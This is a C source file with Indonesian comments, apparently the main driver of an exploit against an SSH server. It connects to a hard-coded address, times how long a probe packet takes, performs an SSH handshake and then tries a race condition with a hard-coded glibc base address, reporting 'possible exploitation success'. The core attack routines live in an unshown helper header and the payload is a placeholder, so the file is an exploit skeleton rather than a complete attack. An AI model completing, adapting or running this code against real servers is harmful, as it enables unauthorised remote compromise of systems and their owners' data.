#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include "helper.h"

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];

    // Membuat socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Mengatur server address
    server.sin_family = AF_INET;
    server.sin_port = htons(12345);
    server.sin_addr.s_addr = inet_addr("192.168.1.1");

    // Menghubungkan ke server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("Connection failed");
        return -1;
    }

    // Menyiapkan data untuk dikirim
    snprintf(buffer, sizeof(buffer), "Exploit data");

    // Menghitung waktu pengiriman
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    if (send_packet(sock, buffer, strlen(buffer)) < 0) {
        perror("send_packet failed");
        return -1;
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed_time = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1000000000.0;
    printf("Estimated parsing time: %f seconds\n", elapsed_time);

    // Melakukan handshake SSH dan mencoba kondisi balapan
    if (perform_ssh_handshake(sock) < 0) {
        perror("SSH handshake failed");
        return -1;
    }

    printf("Attempting race condition...\n");

    unsigned long glibc_base = 0xb7200000;  // Contoh base address
    if (attempt_race_condition(sock, elapsed_time, glibc_base)) {
        printf("Possible exploitation success on attempt 0 with glibc base 0x%lx!\n", glibc_base);
    }

    close(sock);
    return 0;
}
